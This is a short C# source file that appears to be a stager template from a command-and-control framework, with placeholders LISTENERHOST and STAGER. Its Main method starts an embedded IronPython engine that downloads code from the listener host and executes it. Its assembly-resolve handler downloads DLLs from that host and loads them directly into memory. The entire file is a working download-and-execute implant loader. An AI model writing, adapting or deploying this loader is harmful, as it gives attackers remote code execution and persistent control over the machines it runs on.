using System;
using System.Reflection;
using System.Net;
using IronPython.Hosting;
using Microsoft.Scripting;
using IronPython.Modules;

namespace cmd
{
	class Program
	{
		static Program()
        {
			AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(OnResolveAssembly);
		}
        public static void Main(string[] args)
		{
            var engine = Python.CreateEngine();
            engine.Execute("h = 'LISTENERHOST';from System.Net import WebClient;exec(WebClient().DownloadString(h+'/download/importer'));add_remote_repo(h + '/download/stdlib/');STAGER");
		}
        private static Assembly OnResolveAssembly(object sender, ResolveEventArgs args)
        {
            string name = args.Name.Substring(0, args.Name.IndexOf(','));
            WebClient wc = new WebClient();
            return Assembly.Load(wc.DownloadData("LISTENERHOST/download/45/" + name + ".dll"));
		}
    }
}
